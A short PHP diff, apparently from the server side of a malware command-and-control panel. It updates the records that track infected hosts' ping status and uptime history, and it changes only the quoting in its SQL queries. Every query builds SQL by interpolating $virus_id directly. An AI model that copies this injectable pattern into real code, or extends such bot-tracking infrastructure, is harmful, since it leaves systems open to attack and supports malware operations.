@@ -12,6 +12,8 @@
 use Kelvinho\Virus\Singleton\Logs;
 use Kelvinho\Virus\Virus\Virus;
 
+global $mysqli;
+
 /**
  * Limits each virus to only have 1000 entries in the uptimes table
  *
@@ -19,10 +21,10 @@ use Kelvinho\Virus\Virus\Virus;
  * @param string $virus_id
  */
 function trimEntry(mysqli $mysqli, string $virus_id) {
-    if (!$answer = $mysqli->query("select count(*) as count, virus_id from uptimes where virus_id = \"$virus_id\" group by virus_id")) Logs::mysql($mysqli);
+    if (!$answer = $mysqli->query("select count(*) as count, virus_id from uptimes where virus_id = '$virus_id' group by virus_id")) Logs::mysql($mysqli);
     if ($row = $answer->fetch_assoc())
         if ($row["count"] > 1000)
-            if ($mysqli->query("delete from uptimes where virus_id = \"$virus_id\" order by unix_time limit " . ($row["count"] - 1000))) Logs::mysql($mysqli);
+            if ($mysqli->query("delete from uptimes where virus_id = '$virus_id' order by unix_time limit " . ($row["count"] - 1000))) Logs::mysql($mysqli);
 }
 
 if (!$answer = $mysqli->query("select virus_id, last_ping, cast(active as unsigned integer) as activeI from viruses")) Logs::mysql($mysqli);
@@ -34,14 +36,14 @@ while ($row = $answer->fetch_assoc()) {
     if ($active == 0) { // previously deemed not active, so check if last ping is considered active
         if (Virus::getState($last_ping) == Virus::VIRUS_ACTIVE) {
             trimEntry($mysqli, $virus_id);
-            $mysqli->query("update viruses set active = b'1' where virus_id = \"$virus_id\"");
-            $mysqli->query("insert into uptimes (virus_id, unix_time, active) values (\"$virus_id\", " . time() . ", b'1')");
+            $mysqli->query("update viruses set active = b'1' where virus_id = '$virus_id'");
+            $mysqli->query("insert into uptimes (virus_id, unix_time, active) values ('$virus_id', " . time() . ", b'1')");
         }
     } else { // previously deemed active, so check if last ping is considered inactive
         if (Virus::getState($last_ping) != Virus::VIRUS_ACTIVE) {
             trimEntry($mysqli, $virus_id);
-            $mysqli->query("update viruses set active = b'0' where virus_id = \"$virus_id\"");
-            $mysqli->query("insert into uptimes (virus_id, unix_time, active) values (\"$virus_id\", " . time() . ", b'0')");
+            $mysqli->query("update viruses set active = b'0' where virus_id = '$virus_id'");
+            $mysqli->query("insert into uptimes (virus_id, unix_time, active) values ('$virus_id', " . time() . ", b'0')");
         }
     }
 }
